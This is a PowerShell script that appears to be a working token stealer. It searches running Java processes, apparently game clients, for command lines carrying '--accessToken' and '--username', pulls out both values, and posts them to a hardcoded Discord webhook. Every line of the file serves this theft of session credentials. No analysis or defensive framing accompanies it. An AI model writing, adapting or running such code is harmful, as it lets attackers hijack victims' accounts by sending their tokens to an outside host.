$webhookUrl = "https://discord.com/api/webhooks/1398946726496305152/Kn9ULfJCNezuBKC_3Bs0E9l77SFysZLSqMMF0K-O8wDGJUgG13l5Mk8riFWJznckKInt"

Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
    Select-Object -ExpandProperty CommandLine |
    ForEach-Object {
        $accessToken = $null
        $username = $null

        if ($_ -match '--accessToken\s+(\S+)') {
            $accessToken = $matches[1]
        }
        if ($_ -match '--username\s+(\S+)') {
            $username = $matches[1]
        }

        if ($accessToken -and $username) {
           
            $message = @"
> **AccessToken:** $accessToken
> **Username:** $username
"@

            Write-Output $message

            
            $payload = @{
                content = $message
            } | ConvertTo-Json -Depth 10

            
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
        }
    } 
